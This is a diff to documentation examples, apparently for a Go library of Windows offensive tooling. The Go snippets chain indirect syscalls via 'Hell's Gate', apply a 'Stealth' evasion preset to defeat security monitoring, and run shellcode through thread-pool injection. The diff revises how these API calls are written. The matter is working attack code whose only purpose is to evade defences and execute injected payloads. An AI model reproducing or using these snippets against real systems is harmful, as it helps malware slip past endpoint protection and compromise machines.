@@ -145,13 +145,10 @@ import (
 )
 
 func main() {
-    caller, err := wsyscall.New(wsyscall.MethodIndirect, wsyscall.WithHellsGate())
-    if err != nil {
-        log.Fatal(err)
-    }
+    caller := wsyscall.New(wsyscall.MethodIndirect, wsyscall.NewHellsGate())
     errs := evasion.ApplyAll(preset.Stealth(), caller)
-    for name, err := range errs {
-        log.Printf("%s: %v", name, err)
+    for name, e := range errs {
+        log.Printf("%s: %v", name, e)
     }
 }
 ```
@@ -170,7 +167,7 @@ func run(shellcode []byte) error {
     evasion.ApplyAll(preset.Stealth(), nil)
 
     // Step 2: do all injection / RWX allocation here
-    if err := inject.RunShellcode(shellcode); err != nil {
+    if err := inject.ThreadPoolExec(shellcode); err != nil {
         return err
     }
 
